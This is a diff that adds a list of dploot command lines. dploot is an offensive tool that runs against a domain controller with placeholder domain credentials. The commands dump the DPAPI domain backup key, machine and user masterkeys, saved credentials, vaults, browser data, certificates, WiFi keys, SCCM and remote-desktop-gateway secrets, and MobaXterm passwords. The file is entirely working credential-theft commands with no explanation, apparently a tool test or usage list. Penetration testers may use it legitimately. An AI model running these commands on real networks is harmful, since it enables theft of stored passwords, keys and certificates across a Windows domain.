@@ -1,0 +1,24 @@
+dploot machinecertificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -quiet
+dploot backupkey -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -quiet
+dploot certificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk  -quiet
+dploot browser -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile /data/masterkeys
+dploot masterkeys -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
+dploot masterkeys -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -passwords passwords
+dploot credentials -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
+dploot credentials -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
+dploot vaults -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
+dploot vaults -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
+dploot rdg -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
+dploot rdg -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
+dploot certificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
+dploot certificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
+dploot browser -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
+dploot browser -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
+dploot machinemasterkeys -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
+dploot machinecredentials -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
+dploot machinevaults -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
+dploot machinecertificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
+dploot wifi -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
+dploot sccm -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
+dploot backupkey -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
+dploot mobaxterm -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
